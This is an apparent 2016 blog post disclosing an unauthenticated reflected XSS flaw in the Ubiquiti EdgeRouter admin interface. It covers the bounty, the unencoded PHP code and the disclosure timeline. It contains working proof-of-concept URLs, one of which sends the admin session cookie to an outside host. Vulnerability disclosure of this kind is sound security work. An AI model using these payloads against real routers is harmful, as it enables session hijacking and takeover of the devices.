---
author: mpf
date: 2016-04-06T13:15:55+01:00
keywords:
- security
- xss
- ubnt
- edgerouter
title: Unauthenticated XSS in EdgeRouter admin interface
topics:
- security
type: post
---

In February 2015 I discovered a cross-site scripting vulnerability in
Ubiquiti's EdgeRouter Administrative interface. These are powerful and cheap
devices which are also pretty fun to use and configure, so I'd definitely
recommend them even though I found this issue.

After a couple of false-starts and emails getting lost I was invited to submit
details of the vulnerability via [HackerOne](https://hackerone.com), and they
fairly quickly decided to pay me a $500 US bounty.

So, if you have an EdgeMAX device you should head to the download page on
[ubnt.com](https://www.ubnt.com/download/edgemax/) and grab at least version
1.8.0, which fixes this issue, as well as lots of others, and adds some cool
new features. For full details see the [release notes](http://community.ubnt.com/t5/EdgeMAX-Updates-Blog/EdgeMAX-EdgeRouter-software-release-v1-8-0/ba-p/1490756).

If you're interested in more detais, read on!

## Overview

Prior to version 1.8.0 the catchall PHP error page on EdgeRouter devices
doesn't correctly encode the contents of several URL parameters, and is
vulnerable to unauthenticated reflected cross-site scripting.

This, coupled with the fact the `PHPSESSIONID` cookie is not marked as HttpOnly
mean that remote attackers can steal session cookies, and potentially hijack
active administrative sessions.

## Details

A simple proof of concept, which displays the session cookie in a popup is:

        https://router_ip:8088/anynonexistantpath?url=%27%22%3E%3CSCRIPT%3Ealert%28document.cookie%29%3C/SCRIPT%3E

or to send the cookie's value to a remote server, using a trick such as this:

        https://router_ip:8088/anynonexistantpath?url=%3Cscript%3Edocument.write%28%27%3Cimg%20src=%22//hackerific.net/cookie_%27%2bdocument.cookie%2b%27%22%3E%27%29%3C/script%3E

**Warning**: This URL will make a request for a non-existent page on audited.netcraft.com)

This could also be used to trick a logged in administrator into perform
arbitrary actions using the web interface, or perform attacks using a framework
such as BeEF: http://beefproject.com/.

In all cases, the vulnerable code is in `/var/www/php/app/views/errors/catchall.php`:

First, the vulnerable parameters are defined:

        <?php
                //define the details that are available to display in the order to display them
                $availableDetails = array(
                        'clientaddr' => 'Client address',
                        'clientname' => 'Client name',
                        'clientident' => 'Client ident',
                        'srcclass' => 'Client group',
                        'targetclass' => 'Target class',
                        'url' => 'URL'
                );

                //determine which details were passed in the query string
                $details = array_intersect(array_keys($_GET), array_keys($availableDetails));
        ?>

And then, a little later on, they're echoed to the page:

        <?php foreach ($availableDetails as $key=>$detail): ?>
                <?php if (in_array($key, $details)): ?>
                <dl class="detail">
                        <dt><?php echo($detail); ?></dt>
                        <dd><?php echo($_GET[$key]); ?></dd>
                </dl>
                <?php endif; ?>
        <?php endforeach; ?>

This code echoes the parameter to the page without adequate encoding, causing this issue.

## Vulnerability

While investigating this issue, I downloaded and extracted several firmware
images for EdgeRouter products, and this affects versions back to 1.4,
and up to the current version at the time of testing, which was 1.7.

## Timeline

* **Originally discovered**: Feb 2015.  Attempted contact via email but didn't get anywhere for several months. Eventually, I was invited to join HackerOne and post there.
* **Submitted to HackerOne**: 31st August 2015. From this point Ubiquiti's communications were excellent.
* **Fix released**: 26th February 2016: Ubiquiti released firmware version 1.8.0, which resolved the issue.
